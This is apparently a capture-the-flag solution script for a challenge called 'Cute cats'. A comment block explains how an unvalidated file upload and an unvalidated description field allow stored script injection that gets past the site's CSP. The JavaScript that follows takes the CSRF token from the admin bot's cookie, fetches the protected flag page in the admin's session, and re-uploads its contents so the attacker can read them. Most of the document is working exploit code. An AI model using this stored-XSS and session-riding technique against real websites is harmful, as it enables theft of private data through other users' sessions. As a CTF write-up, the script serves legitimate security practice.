/*
"Cute cats" was a website allowing people to upload pictures of cute cats and descriptions.
You could also report a picture and admin (bot user) would remove it.
The goal was to get a flag from page https://h4x.0x04.net/flag/.
Website had CSP, but uploaded files weren't validated (not even extension), neither was description.
The idea is to upload this script and report "image" to call admin.
In description of this script you put <script src="../../media/uploads/cute-cats.js"></script>.
This triggers when admin comes to "image" website and forces him to upload website with flag as image.
*/

let csrf = document.cookie.split('=')[1];

function secondPart() {
    let flagpage = this.responseText;
    xhr = new XMLHttpRequest();
    xhr.open("POST", "https://h4x.0x04.net/upload/");
    let form = new FormData();
    let file = new File([flagpage], "flag.html");
    form.append("csrfmiddlewaretoken", csrf);
    form.append("image", file);
    form.append("desc", "whatever");
    xhr.send(form);
}

setTimeout(function() {
    let xhr = new XMLHttpRequest();
    xhr.addEventListener("load", secondPart);
    xhr.open("POST", "https://h4x.0x04.net/flag/");
    let form = new FormData();
    form.append("csrfmiddlewaretoken", csrf);
    xhr.send(form);
}, 1000);

